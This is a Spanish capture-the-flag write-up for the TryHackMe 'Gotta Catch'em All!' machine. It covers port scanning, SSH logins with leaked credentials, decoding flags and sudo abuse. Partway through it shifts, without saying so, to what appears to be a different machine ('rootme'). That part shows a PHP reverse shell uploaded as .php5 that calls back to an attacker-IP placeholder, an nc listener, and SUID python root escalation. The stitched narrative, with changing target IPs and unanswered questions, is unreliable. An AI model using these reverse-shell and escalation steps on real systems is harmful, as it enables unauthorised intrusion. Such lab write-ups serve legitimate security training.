@@ -1,0 +1,357 @@
+I"|\<p>La máquina Gotta Catch’em All!, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean:</p>
+
+<ul>
+  <li>Encontrar el Pokemon tipo Tierra<br /></li>
+  <li>Encontrar el Pokemon tipo Agua<br /></li>
+  <li>Encontrar el Pokemon tipo Fuego<br /></li>
+  <li>¿Cuál es el Pokemon favorito de root?<br /></li>
+</ul>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Sat Oct  8 13:51:10 2022 as: nmap -p- --open --min-rate 5000 -vvv</span>
+       │  <span class="nt">-n</span> <span class="nt">-oG</span> allPorts - Pn 10.10.50.121
+   2   │ <span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
+   3   │ Host: 139.162.17.173 <span class="o">()</span> Status: Up
+   4   │ Host: 139.162.17.173 <span class="o">()</span> Ports: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http/
+       │ //, 443/open/tcp//https///, 587/open/tcp//submission///, 993/open/tcp//imaps///, 995/open/tc
+       │ p//pop3s/// Ignored State: filtered <span class="o">(</span>65528<span class="o">)</span>
+   5   │ Host: 10.10.50.121 <span class="o">()</span>   Status: Up
+   6   │ Host: 10.10.50.121 <span class="o">()</span>   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+   7   │ <span class="c"># Nmap done at Sat Oct  8 13:53:17 2022 -- 2 IP addresses (2 hosts up) scanned in 127.36 sec</span>
+       │ onds
+</code></pre></div></div>
+
+<p>Nos reporta una serie de puertos abiertos. Debido a que el puerto 80 está abierto, introducimos la $IP-VICTIMA en un buscador y nos reporta el servicio Apache. Sin mucha más información checkeamos la consola para ver si encontramos algo.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content_section_text"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;p&gt;</span>
+                Please use the <span class="nt">&lt;tt&gt;</span>ubuntu-bug<span class="nt">&lt;/tt&gt;</span> tool to report bugs in the
+                Apache2 package with Ubuntu. However, check <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://bugs.launchpad.net/ubuntu/+source/apache2"</span><span class="nt">&gt;</span>existing
+                bug reports<span class="nt">&lt;/a&gt;</span> before reporting a new bug.
+          <span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;REDACTED1&gt;</span>:<span class="nt">&lt;REDACTED2&gt;</span>
+         <span class="c">&lt;!--(Check console for extra surprise!)--&gt;</span>
+      <span class="nt">&lt;/REDACTED2&gt;&lt;/REDACTED1&gt;</span>
+</code></pre></div></div>
+
+<p>Parece ser que hay un usuario y contraseña entre los dos puntos antes del comentario. Intentaremos entonces usar SSH para conectarnos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh ???????@10.10.224.44
+The authenticity of host <span class="s1">'10.10.224.44 (10.10.224.44)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:pLr5hKfcRZWD4ZBMz/8vFWnJ2xslYHSX94C4KXwOLVg.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:6: [hashed name]
+    ~/.ssh/known_hosts:8: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.224.44<span class="s1">' (ED25519) to the list of known hosts.
+pokemon@10.10.224.44'</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.15.0-112-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+84 packages can be updated.
+0 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+pokemon@root:~<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Hemos conseguido así una consola interactiva. Desde este punto e investigando un poco hayamos el primer pokemon:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pokemon@root:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-R</span>
+.:
+Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
+
+./Desktop:
+P0kEmOn.zip
+
+./Documents:
+
+./Downloads:
+
+./Music:
+
+./Pictures:
+
+./Public:
+
+./Templates:
+
+./Videos:
+Gotta
+
+./Videos/Gotta:
+Catch
+
+./Videos/Gotta/Catch:
+Them
+
+./Videos/Gotta/Catch/Them:
+ALL!
+
+./Videos/Gotta/Catch/Them/ALL!:
+Could_this_be_what_Im_looking_for?.cplusplus
+</code></pre></div></div>
+
+<p>Nos metemos en el directorio Desktop y descomprimimos el archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pokemon@root:~/Desktop<span class="nv">$ </span>unzip P0kEmOn.zip 
+Archive:  P0kEmOn.zip
+   creating: P0kEmOn/
+  inflating: P0kEmOn/grass-type.txt  
+</code></pre></div></div>
+
+<p>Abrimos el archivo y nos reporta la solución en hexadecimal por lo que con el comnado xxd terminamos de resolverlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pokemon@root:~/Desktop/P0kEmOn<span class="nv">$ </span><span class="nb">cat </span>grass-type.txt 
+50 6f 4b 65 4d 6f 4e 7b 42 75 6c 62 61 73 61 75 72 7d
+pokemon@root:~/Desktop/P0kEmOn<span class="nv">$ </span><span class="nb">cat </span>grass-type.txt | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+???????<span class="o">{</span>????????<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Cuando hemos hecho ls -R, nos hemos dado cuenta de que existe un directorio (./Videos/Gotta/Catch/Them/All!:) con un archivo que puede que contenga información importante. Nos dirigimos a el y lo abrimos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pokemon@root:~<span class="nv">$ </span><span class="nb">cd </span>Videos/Gotta/Catch/Them/ALL<span class="se">\!</span>/
+pokemon@root:~/Videos/Gotta/Catch/Them/ALL!<span class="nv">$ </span><span class="nb">ls
+</span>Could_this_be_what_Im_looking_for?.cplusplus
+pokemon@root:~/Videos/Gotta/Catch/Them/ALL!<span class="nv">$ </span><span class="nb">cat </span>Could_this_be_what_Im_looking_for<span class="se">\?</span>.cplusplus 
+<span class="c"># include &lt;iostream&gt;</span>
+
+int main<span class="o">()</span> <span class="o">{</span>
+        std::cout &lt;&lt; <span class="s2">"??? : ????????"</span>
+        <span class="k">return </span>0<span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Parece ser que tenemos otro usuario y contraseña por lo que inetntamos conectarnos a el por SHH con:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pokemon@root:~/Videos/Gotta/Catch/Them/ALL!<span class="nv">$ </span>ssh ash@10.10.224.44
+The authenticity of host <span class="s1">'10.10.224.44 (10.10.224.44)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:mXXTCQORSu35gV+cSi+nCjY/W0oabQFNjxuXUDrsUHI.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '</span>10.10.224.44<span class="s1">' (ECDSA) to the list of known hosts.
+ash@10.10.224.44'</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.15.0-112-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+84 packages can be updated.
+0 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/ash: Permission denied
+<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Nos reporta una consola. En este punto podemos hacer sudo -l para ver los permisos que tiene el usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>ash: 
+Matching Defaults entries <span class="k">for </span>ash on root:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User ash may run the following commands on root:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div>
+
+<p>Vemos que puede usar todos los comandos como sudo. Nos dirigimos entonces a /home para ver su contenido. En el aparece el usuario ash y el archivo roots-pokemon.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /home
+<span class="nv">$ </span><span class="nb">ls
+</span>ash  pokemon  roots-pokemon.txt
+</code></pre></div></div>
+
+<p>Como somos el usuario ash y este puede usar todos los comandos como root intentamos abrir el archivo roots-pokemon.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cat </span>roots-pokemon.txt
+???????!
+</code></pre></div></div>
+
+<p>Obtenemos el pokemon favorito de root y solo nos quedaría el tipo agua y fuego. Para ello, podemos buscar archivos que se llamen ???water???.txt y ???fire???.txt</p>
+
+<p>Lo hacemos de esta forma:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="k">*</span>water<span class="k">*</span>.txt 2&gt;/dev/null
+/var/www/html/water-type.txt
+<span class="nv">$ </span><span class="nb">sudo cat</span> /var/www/html/water-type.txt
+Ecgudfxq_EcGmP<span class="o">{</span>Ecgudfxq<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Parece ser que se ha aplicado una rotación en el texto. Para Solucionar esto, podemos dirigirnos a <a href="https://rot13.com"> rot13 
+A continuación pasamos a la siguiente pregunta en la que tenemos que encontrar el directorio oculto. Para ello mediante la herramineta gobuster hacemos:</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.252.141/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.252.141/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              txt,php,html
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/12 07:20:07 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/css/]
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 616]                                
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 616]                                
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/js/] 
+/p????                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/p????/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]                                  
+/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/uploads/]
+                                                                                   
+<span class="o">===============================================================</span>
+2022/10/12 07:20:45 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Buscamos los directorios de la $IP-VICTIMA usando el archivo de lista de palabras directory-list1.0.txt</p>
+
+<p>En este punto podríamos usar cualquier lista de palabras.</p>
+
+<p>Encontramos el directorio oculto que sabemos que empieza por /p????</p>
+
+<p>Nos metemos en el directorio oculto desde el navegador y parece que podemos subir archivos, probaremos entonces a conseguir una reverse shell mediante este método.</p>
+
+<h1 id="file-upload-vulnerability-direct-file-upload"><a href="$header-1"></a>File Upload Vulnerability (Direct File upload)</h1>
+
+<p>Primero comprobaremos que se pueden subir imagenes correctamente. Para ello, tras subirla en /p???? nos dirigimos al directorio /uploads que hemos reconocido en el paso anterior con gobuster.</p>
+
+<p>La imagen aparece en el panel de /uploads por lo que si que nos deja. El siguiente paso será descargarnos una php reverse shell. En mi caso lo he hecho desde <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"> Pentest Monkey </a>.</p>
+
+<p>Una vez descargada modificamos el archivo .php, tanto el puerto, por ejemplo el 4444 como el valor $ip. <strong>¡Debe ser tu IP!</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'$MY-IP'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Desde la máquina atcante nos ponemos en escucha por el puerto 4444 con nc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+
+<p>Agregamos nuestra reverse shell con extensión .php5 (porque con php no nos deja) y le damos a upload.</p>
+
+<p>Nos dice que todo ha ido correcto y nos metemos en el panel de /uploads. Ahí se encuentra el archivo .php5</p>
+
+<p>Lo ejecutamos estando en escucha y…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.8.79.39] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.252.141] 55654
+Linux rootme 4.15.0-112-generic <span class="c">#113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 11:55:39 up  1:09,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ 
+</span></code></pre></div></div>
+
+<p>Conseguimos acceso a la máquina víctima.</p>
+
+<h1 id="enumeración-interna-y-escalada-de-privilegios"><a href="$header-1"></a>Enumeración interna y escalada de privilegios</h1>
+
+<p>Buscamos un archivo en el sistema que se llame user.txt y lo abrimos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-name</span> user.txt 2&gt;/dev/null
+/var/www/user.txt
+<span class="nv">$ </span><span class="nb">cat</span> /var/www/user.txt
+THM<span class="o">{</span>???_???_?_?????<span class="o">}</span>
+</code></pre></div></div>
+<p>Para buscar archivos con permisos SUID podemos hacer:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nb">type</span> <span class="nt">-f</span> <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt; /dev/null
+</code></pre></div></div>
+<p>Encontramos así la respuesta a la siguiente pregunta:</p>
+
+<pre><code class="language-vash">/usr/bin/python
+</code></pre>
+
+<p>Sabiendo que tenemos permisos, para escalar privilegios podemos usar uno de los métodos de <a href="https://gtfobins.github.io/gtfobins/python/#suid"> GTFOBins</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./python <span class="nt">-c</span> <span class="s1">'import os; os.execl("/bin/sh", "sh", "-p")'</span>
+<span class="c"># whoami</span>
+root
+<span class="c"># cat /root/root.txt</span>
+THM<span class="o">{</span>????????<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
